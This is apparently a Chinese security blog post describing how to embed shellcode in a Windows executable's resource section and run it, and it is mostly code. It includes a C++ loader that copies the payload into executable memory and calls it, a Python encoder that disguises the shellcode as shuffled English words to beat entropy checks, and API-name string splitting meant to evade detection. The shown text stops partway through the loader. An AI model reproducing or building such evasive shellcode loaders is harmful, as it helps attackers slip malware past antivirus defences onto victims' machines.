<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<p><code>.rsrc</code> 段是PE文件中的一个特定部分，专门用来存储资源数据。这些资源通常包括图标、位图、字符串表、对话框、菜单、版本信息、字体等</p>
<p>具体的shellcode加载方式不在此探讨 在这使用传统的指针执行</p>
<h1 data-content="1" id="afea3efb3997cb2244412f617fcd12bc">WindowsAPI</h1>
<p>需要用到如下API</p>
<p><code>FindResource</code> 获取指定资源的信息块的句柄 传给<code>LoadResource</code>以获取资源的句柄</p>
<p><code>LoadResource</code> 获取资源的句柄</p>
<p><code>LockResource</code> 指向资源第一个字节的指针</p>
<p><code>SizeofResource</code>  指定资源的大小</p>
<h1 data-content="1" id="6d05517fdcd3c4dfc772a6475169167b">具体过程</h1>
<p>先添加资源</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241115164721-3a145be8-a32e-1.png"/></p>
<p>将shellcode修改扩展名为ico 并导入</p>
<p>资源类型为<code>RCDATA</code> 表示自定义数据</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241115164726-3d15f28e-a32e-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241115164730-3fd1778c-a32e-1.png"/></p>
<p><code>HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);</code></p>
<p><code>HGLOBAL hGlobal = LoadResource(NULL, hRsrc);</code></p>
<p>从当前进程中查找资源</p>
<p><code>LPVOID addr = LockResource(hGlobal);</code></p>
<p>获取地址</p>
<p><code>size_t len = SizeofResource(NULL, hRsrc);</code></p>
<p>获取资源大小</p>
<p>.rsrc的内存属性是只读 开一块新内存拷过去</p>
<div class="highlight"><pre><span></span><span class="n">LPVOID</span> <span class="n">buf</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span> 
    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
    <span class="k">typedef</span> <span class="nf">void</span> <span class="p">(</span><span class="o">*</span><span class="n">ShellcodeFunc</span><span class="p">)();</span>
    <span class="n">ShellcodeFunc</span> <span class="n">execShellcode</span> <span class="o">=</span> <span class="p">(</span><span class="n">ShellcodeFunc</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
    <span class="n">execShellcode</span><span class="p">();</span>
</pre></div>
<p>执行</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241115164754-4dc1ae48-a32e-1.png"/></p>
<p>直接把shellcode弄进去</p>
<p>通过die可以看见此时<code>.rsrc</code> 的熵值极高 达到7.99</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241115164743-47a90d26-a32e-1.png"/></p>
<h1 data-content="1" id="6999680c1587a71978fc19d2dbaa928b">解决熵值过高的问题</h1>
<p>这里选择讲shellcode转英文单词 从资源文件读取出来之后再解密</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">ascii_strings</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s1">'Ably'</span><span class="p">,</span> <span class="s1">'Afar'</span><span class="p">,</span> <span class="s1">'Area'</span><span class="p">,</span> <span class="s1">'Army'</span><span class="p">,</span> <span class="s1">'Away'</span><span class="p">,</span> <span class="s1">'Baby'</span><span class="p">,</span> <span class="s1">'Back'</span><span class="p">,</span> <span class="s1">'Ball'</span><span class="p">,</span> <span class="s1">'Band'</span><span class="p">,</span> <span class="s1">'Bank'</span><span class="p">,</span> <span class="s1">'Base'</span><span class="p">,</span> <span class="s1">'Bear'</span><span class="p">,</span> <span class="s1">'Beat'</span><span class="p">,</span> <span class="s1">'Bill'</span><span class="p">,</span> <span class="s1">'Body'</span><span class="p">,</span> <span class="s1">'Book'</span><span class="p">,</span>
    <span class="s1">'Burn'</span><span class="p">,</span> <span class="s1">'Call'</span><span class="p">,</span> <span class="s1">'Card'</span><span class="p">,</span> <span class="s1">'Care'</span><span class="p">,</span> <span class="s1">'Case'</span><span class="p">,</span> <span class="s1">'Cash'</span><span class="p">,</span> <span class="s1">'Cast'</span><span class="p">,</span> <span class="s1">'City'</span><span class="p">,</span> <span class="s1">'Club'</span><span class="p">,</span> <span class="s1">'Come'</span><span class="p">,</span> <span class="s1">'Cook'</span><span class="p">,</span> <span class="s1">'Cope'</span><span class="p">,</span> <span class="s1">'Cost'</span><span class="p">,</span> <span class="s1">'Damn'</span><span class="p">,</span> <span class="s1">'Dare'</span><span class="p">,</span> <span class="s1">'Date'</span><span class="p">,</span>
    <span class="s1">'Dead'</span><span class="p">,</span> <span class="s1">'Deal'</span><span class="p">,</span> <span class="s1">'Deep'</span><span class="p">,</span> <span class="s1">'Deny'</span><span class="p">,</span> <span class="s1">'Door'</span><span class="p">,</span> <span class="s1">'Down'</span><span class="p">,</span> <span class="s1">'Draw'</span><span class="p">,</span> <span class="s1">'Drop'</span><span class="p">,</span> <span class="s1">'Duly'</span><span class="p">,</span> <span class="s1">'Duty'</span><span class="p">,</span> <span class="s1">'Earn'</span><span class="p">,</span> <span class="s1">'East'</span><span class="p">,</span> <span class="s1">'Easy'</span><span class="p">,</span> <span class="s1">'Edge'</span><span class="p">,</span> <span class="s1">'Else'</span><span class="p">,</span> <span class="s1">'Even'</span><span class="p">,</span>
    <span class="s1">'Ever'</span><span class="p">,</span> <span class="s1">'Face'</span><span class="p">,</span> <span class="s1">'Fact'</span><span class="p">,</span> <span class="s1">'Fail'</span><span class="p">,</span> <span class="s1">'Fair'</span><span class="p">,</span> <span class="s1">'Fall'</span><span class="p">,</span> <span class="s1">'Farm'</span><span class="p">,</span> <span class="s1">'Fast'</span><span class="p">,</span> <span class="s1">'Fear'</span><span class="p">,</span> <span class="s1">'Feel'</span><span class="p">,</span> <span class="s1">'File'</span><span class="p">,</span> <span class="s1">'Fill'</span><span class="p">,</span> <span class="s1">'Film'</span><span class="p">,</span> <span class="s1">'Find'</span><span class="p">,</span> <span class="s1">'Fire'</span><span class="p">,</span> <span class="s1">'Firm'</span><span class="p">,</span>
    <span class="s1">'Fish'</span><span class="p">,</span> <span class="s1">'Flat'</span><span class="p">,</span> <span class="s1">'Food'</span><span class="p">,</span> <span class="s1">'Foot'</span><span class="p">,</span> <span class="s1">'Form'</span><span class="p">,</span> <span class="s1">'Full'</span><span class="p">,</span> <span class="s1">'Fund'</span><span class="p">,</span> <span class="s1">'Gain'</span><span class="p">,</span> <span class="s1">'Game'</span><span class="p">,</span> <span class="s1">'Girl'</span><span class="p">,</span> <span class="s1">'Give'</span><span class="p">,</span> <span class="s1">'Goal'</span><span class="p">,</span> <span class="s1">'Gold'</span><span class="p">,</span> <span class="s1">'Good'</span><span class="p">,</span> <span class="s1">'Grow'</span><span class="p">,</span> <span class="s1">'Hair'</span><span class="p">,</span>
    <span class="s1">'Half'</span><span class="p">,</span> <span class="s1">'Hall'</span><span class="p">,</span> <span class="s1">'Hand'</span><span class="p">,</span> <span class="s1">'Hang'</span><span class="p">,</span> <span class="s1">'Hard'</span><span class="p">,</span> <span class="s1">'Hate'</span><span class="p">,</span> <span class="s1">'Have'</span><span class="p">,</span> <span class="s1">'Head'</span><span class="p">,</span> <span class="s1">'Hear'</span><span class="p">,</span> <span class="s1">'Help'</span><span class="p">,</span> <span class="s1">'Here'</span><span class="p">,</span> <span class="s1">'Hide'</span><span class="p">,</span> <span class="s1">'High'</span><span class="p">,</span> <span class="s1">'Hold'</span><span class="p">,</span> <span class="s1">'Home'</span><span class="p">,</span> <span class="s1">'Hope'</span><span class="p">,</span>
    <span class="s1">'Hour'</span><span class="p">,</span> <span class="s1">'Hurt'</span><span class="p">,</span> <span class="s1">'Idea'</span><span class="p">,</span> <span class="s1">'Idly'</span><span class="p">,</span> <span class="s1">'Jack'</span><span class="p">,</span> <span class="s1">'John'</span><span class="p">,</span> <span class="s1">'Join'</span><span class="p">,</span> <span class="s1">'Jump'</span><span class="p">,</span> <span class="s1">'Just'</span><span class="p">,</span> <span class="s1">'Keep'</span><span class="p">,</span> <span class="s1">'Kill'</span><span class="p">,</span> <span class="s1">'Kind'</span><span class="p">,</span> <span class="s1">'King'</span><span class="p">,</span> <span class="s1">'Know'</span><span class="p">,</span> <span class="s1">'Lack'</span><span class="p">,</span> <span class="s1">'Lady'</span><span class="p">,</span>
    <span class="s1">'Land'</span><span class="p">,</span> <span class="s1">'Last'</span><span class="p">,</span> <span class="s1">'Late'</span><span class="p">,</span> <span class="s1">'Lead'</span><span class="p">,</span> <span class="s1">'Lend'</span><span class="p">,</span> <span class="s1">'Life'</span><span class="p">,</span> <span class="s1">'Lift'</span><span class="p">,</span> <span class="s1">'Like'</span><span class="p">,</span> <span class="s1">'Line'</span><span class="p">,</span> <span class="s1">'Link'</span><span class="p">,</span> <span class="s1">'List'</span><span class="p">,</span> <span class="s1">'Live'</span><span class="p">,</span> <span class="s1">'Long'</span><span class="p">,</span> <span class="s1">'Look'</span><span class="p">,</span> <span class="s1">'Lord'</span><span class="p">,</span> <span class="s1">'Lose'</span><span class="p">,</span>
    <span class="s1">'Loss'</span><span class="p">,</span> <span class="s1">'Loud'</span><span class="p">,</span> <span class="s1">'Love'</span><span class="p">,</span> <span class="s1">'Make'</span><span class="p">,</span> <span class="s1">'Mark'</span><span class="p">,</span> <span class="s1">'Mary'</span><span class="p">,</span> <span class="s1">'Meet'</span><span class="p">,</span> <span class="s1">'Mind'</span><span class="p">,</span> <span class="s1">'Miss'</span><span class="p">,</span> <span class="s1">'Move'</span><span class="p">,</span> <span class="s1">'Much'</span><span class="p">,</span> <span class="s1">'Must'</span><span class="p">,</span> <span class="s1">'Name'</span><span class="p">,</span> <span class="s1">'Near'</span><span class="p">,</span> <span class="s1">'Need'</span><span class="p">,</span> <span class="s1">'News'</span><span class="p">,</span>
    <span class="s1">'Nice'</span><span class="p">,</span> <span class="s1">'Note'</span><span class="p">,</span> <span class="s1">'Okay'</span><span class="p">,</span> <span class="s1">'Once'</span><span class="p">,</span> <span class="s1">'Only'</span><span class="p">,</span> <span class="s1">'Open'</span><span class="p">,</span> <span class="s1">'Over'</span><span class="p">,</span> <span class="s1">'Page'</span><span class="p">,</span> <span class="s1">'Pain'</span><span class="p">,</span> <span class="s1">'Pair'</span><span class="p">,</span> <span class="s1">'Park'</span><span class="p">,</span> <span class="s1">'Part'</span><span class="p">,</span> <span class="s1">'Pass'</span><span class="p">,</span> <span class="s1">'Past'</span><span class="p">,</span> <span class="s1">'Path'</span><span class="p">,</span> <span class="s1">'Paul'</span><span class="p">,</span>
    <span class="s1">'Pick'</span><span class="p">,</span> <span class="s1">'Plan'</span><span class="p">,</span> <span class="s1">'Play'</span><span class="p">,</span> <span class="s1">'Post'</span><span class="p">,</span> <span class="s1">'Pray'</span><span class="p">,</span> <span class="s1">'Pull'</span><span class="p">,</span> <span class="s1">'Push'</span><span class="p">,</span> <span class="s1">'Rain'</span><span class="p">,</span> <span class="s1">'Rate'</span><span class="p">,</span> <span class="s1">'Read'</span><span class="p">,</span> <span class="s1">'Real'</span><span class="p">,</span> <span class="s1">'Rely'</span><span class="p">,</span> <span class="s1">'Rest'</span><span class="p">,</span> <span class="s1">'Ride'</span><span class="p">,</span> <span class="s1">'Ring'</span><span class="p">,</span> <span class="s1">'Rise'</span><span class="p">,</span>
    <span class="s1">'Risk'</span><span class="p">,</span> <span class="s1">'Road'</span><span class="p">,</span> <span class="s1">'Rock'</span><span class="p">,</span> <span class="s1">'Role'</span><span class="p">,</span> <span class="s1">'Roll'</span><span class="p">,</span> <span class="s1">'Room'</span><span class="p">,</span> <span class="s1">'Rule'</span><span class="p">,</span> <span class="s1">'Sale'</span><span class="p">,</span> <span class="s1">'Save'</span><span class="p">,</span> <span class="s1">'Seat'</span><span class="p">,</span> <span class="s1">'Seek'</span><span class="p">,</span> <span class="s1">'Seem'</span><span class="p">,</span> <span class="s1">'Sell'</span><span class="p">,</span> <span class="s1">'Send'</span><span class="p">,</span> <span class="s1">'Shed'</span><span class="p">,</span> <span class="s1">'Shop'</span><span class="p">,</span>
    <span class="s1">'Show'</span><span class="p">,</span> <span class="s1">'Shut'</span><span class="p">,</span> <span class="s1">'Side'</span><span class="p">,</span> <span class="s1">'Sign'</span><span class="p">,</span> <span class="s1">'Sing'</span><span class="p">,</span> <span class="s1">'Site'</span><span class="p">,</span> <span class="s1">'Size'</span><span class="p">,</span> <span class="s1">'Skin'</span><span class="p">,</span> <span class="s1">'Slip'</span><span class="p">,</span> <span class="s1">'Slow'</span><span class="p">,</span> <span class="s1">'Solo'</span><span class="p">,</span> <span class="s1">'Soon'</span><span class="p">,</span> <span class="s1">'Sort'</span><span class="p">,</span> <span class="s1">'Star'</span><span class="p">,</span> <span class="s1">'Stay'</span><span class="p">,</span> <span class="s1">'Step'</span><span class="p">,</span>
    <span class="s1">'Stop'</span><span class="p">,</span> <span class="s1">'Suit'</span><span class="p">,</span> <span class="s1">'Sure'</span><span class="p">,</span> <span class="s1">'Take'</span><span class="p">,</span> <span class="s1">'Talk'</span><span class="p">,</span> <span class="s1">'Task'</span><span class="p">,</span> <span class="s1">'Team'</span><span class="p">,</span> <span class="s1">'Tell'</span><span class="p">,</span> <span class="s1">'Tend'</span><span class="p">,</span> <span class="s1">'Term'</span><span class="p">,</span> <span class="s1">'Test'</span><span class="p">,</span> <span class="s1">'Text'</span><span class="p">,</span> <span class="s1">'That'</span><span class="p">,</span> <span class="s1">'Then'</span><span class="p">,</span> <span class="s1">'This'</span><span class="p">,</span> <span class="s1">'Thus'</span><span class="p">,</span>
    <span class="s1">'Time'</span><span class="p">,</span> <span class="s1">'Tour'</span><span class="p">,</span> <span class="s1">'Town'</span><span class="p">,</span> <span class="s1">'Tree'</span><span class="p">,</span> <span class="s1">'Turn'</span><span class="p">,</span> <span class="s1">'Type'</span><span class="p">,</span> <span class="s1">'Unit'</span><span class="p">,</span> <span class="s1">'User'</span><span class="p">,</span> <span class="s1">'Vary'</span><span class="p">,</span> <span class="s1">'Very'</span><span class="p">,</span> <span class="s1">'View'</span><span class="p">,</span> <span class="s1">'Vote'</span><span class="p">,</span> <span class="s1">'Wait'</span><span class="p">,</span> <span class="s1">'Wake'</span><span class="p">,</span> <span class="s1">'Walk'</span><span class="p">,</span> <span class="s1">'Wall'</span><span class="p">,</span>
    <span class="s1">'Want'</span><span class="p">,</span> <span class="s1">'Warn'</span><span class="p">,</span> <span class="s1">'Wash'</span><span class="p">,</span> <span class="s1">'Wear'</span><span class="p">,</span> <span class="s1">'Week'</span><span class="p">,</span> <span class="s1">'When'</span><span class="p">,</span> <span class="s1">'Wide'</span><span class="p">,</span> <span class="s1">'Wife'</span><span class="p">,</span> <span class="s1">'Will'</span><span class="p">,</span> <span class="s1">'Wind'</span><span class="p">,</span> <span class="s1">'Wine'</span><span class="p">,</span> <span class="s1">'Wish'</span><span class="p">,</span> <span class="s1">'Wood'</span><span class="p">,</span> <span class="s1">'Word'</span><span class="p">,</span> <span class="s1">'Work'</span><span class="p">,</span> <span class="s1">'Year'</span>
<span class="p">]</span>
<span class="c1"># 多态化 每次table不一样</span>
<span class="n">random</span><span class="o">.</span><span class="n">shuffle</span><span class="p">(</span><span class="n">ascii_strings</span><span class="p">)</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">"Usage: python script.py &lt;input_file&gt;"</span><span class="p">)</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s2">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">raw</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>


<span class="n">encoded</span> <span class="o">=</span> <span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">ascii_strings</span><span class="p">[</span><span class="n">x</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">ascii_strings</span><span class="p">)]</span> <span class="o">+</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">raw</span><span class="p">])</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"table.ico"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
    <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">'''"{}"'''</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s2">"</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">"</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">ascii_strings</span><span class="p">)))</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"shellcode.ico"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
    <span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">'''{}'''</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">encoded</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">'"'</span><span class="p">,</span> <span class="s1">'</span><span class="se">\\</span><span class="s1">"'</span><span class="p">)))</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">"resource.h"</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;vector&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sstream&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unordered_map&gt;</span><span class="cp"></span>

<span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">NTAPI</span><span class="o">*</span> <span class="n">pNtAllocateVirtualMemory</span><span class="p">)(</span>
    <span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
    <span class="n">IN</span> <span class="n">OUT</span> <span class="n">PVOID</span><span class="o">*</span> <span class="n">BaseAddress</span><span class="p">,</span>
    <span class="n">IN</span> <span class="n">ULONG</span> <span class="n">ZeroBits</span><span class="p">,</span>
    <span class="n">IN</span> <span class="n">OUT</span> <span class="n">PSIZE_T</span> <span class="n">RegionSize</span><span class="p">,</span>
    <span class="n">IN</span> <span class="n">ULONG</span> <span class="n">AllocationType</span><span class="p">,</span>
    <span class="n">IN</span> <span class="n">ULONG</span> <span class="n">Protect</span><span class="p">);</span>

<span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>

<span class="n">vector</span><span class="o">&lt;</span><span class="n">string</span><span class="o">&gt;</span> <span class="n">parse_resource_data</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">data</span> <span class="o">=</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*&gt;</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
    <span class="n">vector</span><span class="o">&lt;</span><span class="n">string</span><span class="o">&gt;</span> <span class="n">parsed_strings</span><span class="p">;</span>
    <span class="n">stringstream</span> <span class="n">current_string</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x22</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">// 双引号ASCII码</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">current_string</span><span class="p">.</span><span class="n">str</span><span class="p">().</span><span class="n">empty</span><span class="p">())</span> <span class="p">{</span>
                <span class="n">parsed_strings</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="n">current_string</span><span class="p">.</span><span class="n">str</span><span class="p">());</span>  
                <span class="n">current_string</span><span class="p">.</span><span class="n">str</span><span class="p">(</span><span class="s">""</span><span class="p">);</span>  
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="mh">0x2c</span> <span class="o">&amp;&amp;</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="mh">0x20</span><span class="p">)</span> <span class="p">{</span> 
            <span class="n">current_string</span> <span class="o">&lt;&lt;</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span> 
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">parsed_strings</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">vector</span><span class="o">&lt;</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">&gt;</span> <span class="n">restoreShellcode</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="k">const</span> <span class="n">vector</span><span class="o">&lt;</span><span class="n">string</span><span class="o">&gt;&amp;</span> <span class="n">table</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">unordered_map</span><span class="o">&lt;</span><span class="n">string</span><span class="p">,</span> <span class="kt">int</span><span class="o">&gt;</span> <span class="n">indexMap</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">table</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">indexMap</span><span class="p">[</span><span class="n">table</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">vector</span><span class="o">&lt;</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">&gt;</span> <span class="n">shellcode</span><span class="p">;</span>
    <span class="n">string</span> <span class="n">current_string</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">data</span> <span class="o">=</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*&gt;</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x00</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">// 遇到0x00表示一个字符串结束</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">current_string</span><span class="p">.</span><span class="n">empty</span><span class="p">())</span> <span class="p">{</span>
                <span class="k">auto</span> <span class="n">it</span> <span class="o">=</span> <span class="n">indexMap</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">current_string</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">it</span> <span class="o">!=</span> <span class="n">indexMap</span><span class="p">.</span><span class="n">end</span><span class="p">())</span> <span class="p">{</span>
                    <span class="c1">// 将对应的索引添加到 shellcode 中</span>
                    <span class="n">shellcode</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="n">it</span><span class="o">-&gt;</span><span class="n">second</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="n">current_string</span><span class="p">.</span><span class="n">clear</span><span class="p">();</span>  
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
            <span class="n">current_string</span> <span class="o">+=</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">shellcode</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="n">main</span><span class="p">(){</span>


    <span class="n">HRSRC</span> <span class="n">hRsrcTable</span> <span class="o">=</span> <span class="n">FindResource</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">MAKEINTRESOURCE</span><span class="p">(</span><span class="n">IDR_RCDATA2</span><span class="p">),</span> <span class="n">RT_RCDATA</span><span class="p">);</span>
    <span class="n">HGLOBAL</span> <span class="n">hGlobalTable</span> <span class="o">=</span> <span class="n">LoadResource</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">hRsrcTable</span><span class="p">);</span>
    <span class="n">LPVOID</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">LockResource</span><span class="p">(</span><span class="n">hGlobalTable</span><span class="p">);</span>
    <span class="kt">size_t</span> <span class="n">len</span> <span class="o">=</span> <span class="n">SizeofResource</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">hRsrcTable</span><span class="p">);</span>
    <span class="n">vector</span><span class="o">&lt;</span><span class="n">string</span><span class="o">&gt;</span> <span class="n">table</span> <span class="o">=</span> <span class="n">parse_resource_data</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>



    <span class="n">HRSRC</span> <span class="n">hRsrc</span> <span class="o">=</span> <span class="n">FindResource</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">MAKEINTRESOURCE</span><span class="p">(</span><span class="n">IDR_RCDATA1</span><span class="p">),</span> <span class="n">RT_RCDATA</span><span class="p">);</span>
    <span class="n">HGLOBAL</span> <span class="n">hGlobal</span> <span class="o">=</span> <span class="n">LoadResource</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">hRsrc</span><span class="p">);</span>
    <span class="n">addr</span> <span class="o">=</span> <span class="n">LockResource</span><span class="p">(</span><span class="n">hGlobal</span><span class="p">);</span>
    <span class="n">len</span> <span class="o">=</span> <span class="n">SizeofResource</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">hRsrc</span><span class="p">);</span>
    <span class="k">auto</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="n">restoreShellcode</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">table</span><span class="p">);</span>


    <span class="n">LPVOID</span> <span class="n">lpMem</span> <span class="o">=</span> <span class="k">nullptr</span><span class="p">;</span>
    <span class="n">SIZE_T</span> <span class="n">uSize</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">.</span><span class="n">size</span><span class="p">();</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="n">str1</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="sc">'N'</span><span class="p">,</span><span class="sc">'t'</span><span class="p">,</span><span class="sc">'A'</span><span class="p">,</span><span class="sc">'l'</span><span class="p">,</span><span class="sc">'l'</span><span class="p">,</span><span class="sc">'o'</span><span class="p">,</span><span class="sc">'c'</span><span class="p">,</span><span class="sc">'a'</span><span class="p">,</span><span class="sc">'t'</span><span class="p">,</span><span class="sc">'e'</span><span class="p">,</span><span class="sc">'V'</span><span class="p">,</span><span class="sc">'i'</span><span class="p">,</span><span class="sc">'r'</span><span class="p">,</span><span class="sc">'t'</span><span class="p">,</span><span class="sc">'u'</span><span class="p">,</span><span class="sc">'a'</span><span class="p">,</span><span class="sc">'l'</span><span class="p">,</span><span class="sc">'M'</span><span class="p">,</span><span class="sc">'e'</span><span class="p">,</span><span class="sc">'m'</span><span class="p">,</span><span class="sc">'o'</span><span class="p">,</span><span class="sc">'r'</span><span class="p">,</span><span class="sc">'y'</span><span class="p">,</span><span class="sc">'\0'</span> <span class="p">};</span>

